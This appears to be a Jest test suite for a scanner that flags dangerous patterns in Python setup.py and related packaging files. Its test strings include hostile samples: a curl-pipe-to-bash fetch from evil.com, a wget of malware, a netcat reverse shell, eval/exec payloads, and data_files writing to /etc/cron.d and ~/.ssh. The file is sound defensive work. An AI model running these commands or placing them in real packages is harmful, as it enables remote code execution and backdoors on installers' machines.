import { scanPython, PythonScanner } from '../../../src/heuristics/patterns/python';
import { RiskLevel, FindingCategory } from '../../../src/shared/types';
import * as fs from 'fs';
import * as path from 'path';

describe('Python Pattern Scanner', () => {
  const scanner = new PythonScanner();

  describe('appliesTo', () => {
    it('should apply to setup.py', () => {
      expect(scanner.appliesTo('setup.py')).toBe(true);
    });

    it('should apply to pyproject.toml', () => {
      expect(scanner.appliesTo('pyproject.toml')).toBe(true);
    });

    it('should apply to setup.cfg', () => {
      expect(scanner.appliesTo('setup.cfg')).toBe(true);
    });

    it('should not apply to other files', () => {
      expect(scanner.appliesTo('requirements.txt')).toBe(false);
      expect(scanner.appliesTo('main.py')).toBe(false);
    });
  });

  describe('os.system detection', () => {
    it('should return RED for os.system call', () => {
      const content = `
from setuptools import setup
import os
os.system('curl https://evil.com/payload.sh | bash')
setup(name='test')
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('os.system'))).toBe(true);
    });
  });

  describe('subprocess detection', () => {
    it('should return RED for subprocess.call', () => {
      const content = `
import subprocess
subprocess.call(['wget', 'https://evil.com/malware'])
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('subprocess'))).toBe(true);
    });

    it('should return RED for subprocess.run', () => {
      const content = `
import subprocess
subprocess.run(['bash', '-c', 'echo pwned'], shell=True)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });

    it('should return RED for subprocess.Popen', () => {
      const content = `
import subprocess
subprocess.Popen(['nc', '-e', '/bin/sh', 'evil.com', '1234'])
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });
  });

  describe('exec/eval detection', () => {
    it('should return RED for exec call', () => {
      const content = `
exec(open('malicious.py').read())
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('exec'))).toBe(true);
    });

    it('should return RED for eval call', () => {
      const content = `
payload = "print('hacked')"
eval(payload)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('eval'))).toBe(true);
    });
  });

  describe('__import__ detection', () => {
    it('should return YELLOW for __import__', () => {
      const content = `
module = __import__('os')
module.system('whoami')
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.description.includes('__import__'))).toBe(true);
    });
  });

  describe('base64 decoding detection', () => {
    it('should return YELLOW for base64.b64decode', () => {
      const content = `
import base64
payload = base64.b64decode('cHJpbnQoInB3bmVkIik=')
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('base64') || f.description.includes('Base64'))).toBe(true);
    });
  });

  describe('cmdclass override detection', () => {
    it('should return YELLOW for cmdclass override', () => {
      const content = `
from setuptools import setup
from setuptools.command.install import install

class CustomInstall(install):
    def run(self):
        install.run(self)

setup(
    name='test',
    cmdclass={'install': CustomInstall},
)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.YELLOW)).toBe(true);
      expect(result.findings.some(f => f.description.includes('cmdclass'))).toBe(true);
    });
  });

  describe('safe setup.py', () => {
    it('should return no findings for safe setup.py', () => {
      const content = `
from setuptools import setup, find_packages

setup(
    name='safe-package',
    version='1.0.0',
    packages=find_packages(),
    install_requires=['requests'],
)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings).toHaveLength(0);
    });
  });

  describe('network operations', () => {
    it('should detect urllib.request usage', () => {
      const content = `
import urllib.request
urllib.request.urlopen('https://evil.com/payload')
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.description.includes('Network'))).toBe(true);
    });
  });

  describe('sensitive data_files', () => {
    it('should return RED for data_files targeting /etc/', () => {
      const content = `
setup(
    name='test',
    data_files=[('/etc/cron.d', ['malicious'])],
)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      expect(result.findings.some(f => f.description.includes('data_files'))).toBe(true);
    });

    it('should return RED for data_files targeting .ssh', () => {
      const content = `
setup(
    name='test',
    data_files=[('~/.ssh', ['authorized_keys'])],
)
`;
      const result = scanPython(content, 'setup.py');

      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
    });
  });

  describe('fixture files', () => {
    it('should detect malicious patterns in malicious-setup.py fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/python/malicious-setup.py');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanPython(content, 'setup.py');

      // Should find RED findings
      expect(result.findings.some(f => f.riskLevel === RiskLevel.RED)).toBe(true);
      // Should have multiple findings
      expect(result.findings.length).toBeGreaterThan(1);
    });

    it('should return no findings for safe-setup.py fixture', () => {
      const fixturePath = path.join(__dirname, '../../fixtures/python/safe-setup.py');
      const content = fs.readFileSync(fixturePath, 'utf-8');

      const result = scanPython(content, 'setup.py');

      expect(result.findings).toHaveLength(0);
    });
  });
});
